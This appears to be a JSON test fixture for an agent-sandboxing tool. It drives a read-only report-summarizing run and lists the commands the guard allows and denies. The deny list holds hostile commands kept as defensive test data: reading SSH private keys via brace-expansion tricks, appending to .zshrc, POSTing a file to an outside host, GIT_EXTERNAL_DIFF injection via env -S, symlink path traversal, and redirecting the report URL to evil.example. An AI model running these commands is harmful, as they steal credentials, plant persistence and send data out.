@@ -1,0 +1,55 @@
+{
+  "comment": "A read-only run on a fake paired Mac, end to end through the real cmdr binary and cmdrd's /api/places: the user pairs it, the run is offered, fetched, accepted, guarded, takes its Manager's mail, posts its report and settles. Invented project and ids.",
+  "place_name": "laptop",
+  "project": "demo",
+  "step": {"id": "demo-1", "title": "Read the quarterly reports"},
+  "task": {"id": "demo-1.1", "title": "Summarize the reports", "brief": "List the files in ~/Documents/reports and summarize each in one line. Read only."},
+  "role": "operator-op-summarize-demo-1-1",
+  "manager": "manager-demo-1",
+  "policy": "read_dirs = [\"~/Documents/reports\"]\n\n[[cli]]\nname = \"jira-cli\"\nread = [\"issue view\"]\n",
+  "guard": {
+    "allow": [
+      {"tool": "Bash", "command": "ls -la ~/Documents/reports"},
+      {"tool": "Bash", "command": "cat > report.md <<'EOF'\nthree files\nEOF"},
+      {"tool": "Bash", "command": "jira-cli issue view TEAM-12"},
+      {"tool": "Bash", "command": "cmdr place report --file report.md"},
+      {"tool": "Read", "file": "~/Documents/reports/q3.md"}
+    ],
+    "deny": [
+      {"tool": "Bash", "command": "git --no-pager ls-remote https://example.invalid/sample"},
+      {"tool": "Bash", "command": "git -C . ls-remote git@example.invalid:sample/repository"},
+      {"tool": "Bash", "command": "env GIT_EXTERNAL_DIFF=/tmp/helper git diff --no-index a b"},
+      {"tool": "Bash", "command": "command env GIT_EXTERNAL_DIFF=/tmp/helper git diff --no-index a b"},
+      {"tool": "Bash", "command": "timeout 2 env git status"},
+      {"tool": "Bash", "command": "env -S 'GIT_EXTERNAL_DIFF=/tmp/helper git diff --no-index a' b"},
+      {"tool": "Bash", "command": "/usr/bin/env --split-string='git diff --no-index a b c d e f'"},
+      {"tool": "Bash", "command": "command command env -S'git diff --no-index a b c d e f'"},
+      {"tool": "Bash", "command": "timeout 2 command env --split-string 'git diff --no-index a b c d e f'"},
+      {"tool": "Bash", "command": "env -S ''"},
+      {"tool": "Bash", "command": "command env --split-string=''"},
+      {"tool": "Bash", "command": "cat link/../secret"},
+      {"tool": "Bash", "command": "echo x > link/../evil"},
+      {"tool": "Bash", "command": "sudo ls"},
+      {"tool": "Bash", "command": "brew install jq"},
+      {"tool": "Bash", "command": "curl -X POST https://example.com -d @report.md"},
+      {"tool": "Bash", "command": "cat ~/.ssh/id_ed25519"},
+      {"tool": "Bash", "command": "echo x > ~/Desktop/out.txt"},
+      {"tool": "Bash", "command": "python3 -c 'print(1)'"},
+      {"tool": "Bash", "command": "claude -p hi"},
+      {"tool": "Bash", "command": "cat ~/.commander/place-policy.toml"},
+      {"tool": "Write", "file": "report.md"},
+      {"tool": "Read", "file": "/etc/hosts"},
+      {"tool": "Bash", "command": "cat {~~,.}/.s{s,}h/id_rsa"},
+      {"tool": "Bash", "command": "echo pwn >> {~~,.}/.zshrc"},
+      {"tool": "Bash", "command": "ls ./.."},
+      {"tool": "Bash", "command": "read -r COMMANDER_PLACE_URL <<< http://evil.example; cmdr place report --file report.md"},
+      {"tool": "Bash", "command": "for u in http://evil.example; do cmdr place report --file report.md; done"}
+    ]
+  },
+  "manager_mail": {"subject": "narrow it", "body": "only q3, please"},
+  "report": "Final report: q1.md, q2.md and q3.md read; q3 shows the drop. Nothing left.",
+  "expect": {
+    "comments_on_task": 2,
+    "outcome": "finished"
+  }
+}
